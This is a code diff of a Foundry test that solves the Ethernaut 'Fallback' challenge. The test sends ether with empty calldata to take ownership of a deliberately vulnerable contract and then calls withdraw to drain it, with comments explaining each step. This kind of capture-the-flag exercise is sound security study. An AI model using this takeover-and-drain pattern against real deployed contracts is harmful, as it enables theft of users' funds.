@@ -3,20 +3,24 @@
 pragma solidity 0.8.17;
 
 import "forge-std/Test.sol";
-import {Fallback} from "../../src/levels/Fallback.sol";
+import {Fallback} from "src/levels/Fallback.sol";
+import {FallbackFactory} from "src/levels/FallbackFactory.sol";
 
 // 0xb4c79daB8f259C7Aee6E5b2Aa729821864227e84
 contract FallbackTest is Test {
-    Fallback private level1;
-    address attacker = address(0x123);
+    Fallback private level_1;
+    FallbackFactory private factory;
+    address private attacker = makeAddr("attacker");
 
     function setUp() public {
-        level1 = new Fallback();
+        factory = new FallbackFactory();
+
+        level_1 = Fallback(payable(factory.createInstance(attacker)));
     }
 
-    function testDrainFallbackContract() public {
+    function testDrainLevel_1Contract() public {
         // Add contribution from deployer
-        level1.contribute{value: 100 gwei}();
+        level_1.contribute{value: 100 gwei}();
 
         // Add some ether to attacker account
         vm.deal(attacker, 1 ether);
@@ -24,9 +28,9 @@ contract FallbackTest is Test {
         // Change msg.sender to attacker for all following calls
         vm.startPrank(attacker);
 
-        level1.contribute{value: 1 wei}();
+        level_1.contribute{value: 1 wei}();
 
-        uint contractBalanceBeforeAttack = address(level1).balance;
+        uint contractBalanceBeforeAttack = address(level_1).balance;
         emit log_named_uint(
             "Contract balance before attack",
             contractBalanceBeforeAttack
@@ -34,22 +38,22 @@ contract FallbackTest is Test {
 
         // Send ether to contract without specifying msg.data
         // Since calldata is empty and msg.value contains non-zero value, this will trigger the receive function
-        (bool success, ) = address(level1).call{value: 1 wei}("");
+        (bool success, ) = address(level_1).call{value: 1 wei}("");
         assertTrue(success, "Failed to trigger receive function");
 
         // Check attacker is the new owner
-        address newOwner = level1.owner();
+        address newOwner = level_1.owner();
         assertEq(attacker, newOwner);
         emit log_named_address("New Owner", newOwner);
 
-        uint attackerContribution = level1.getContribution();
+        uint attackerContribution = level_1.getContribution();
 
         uint attackerBalanceBeforeAttack = attacker.balance;
 
         // Drain the contract
-        level1.withdraw();
+        level_1.withdraw();
 
-        assertEq(address(level1).balance, 0, "Contract balance did not drain");
+        assertEq(address(level_1).balance, 0, "Contract balance did not drain");
 
         uint attackerBalanceAfterAttack = attacker.balance;
 
@@ -65,9 +69,11 @@ contract FallbackTest is Test {
 
         emit log_named_uint(
             "Contract balance after attack",
-            address(level1).balance
+            address(level_1).balance
         );
 
+        // Verify solution using Ethernaut validation
+        factory.validateInstance(payable(level_1), attacker);
         vm.stopPrank();
     }
 }
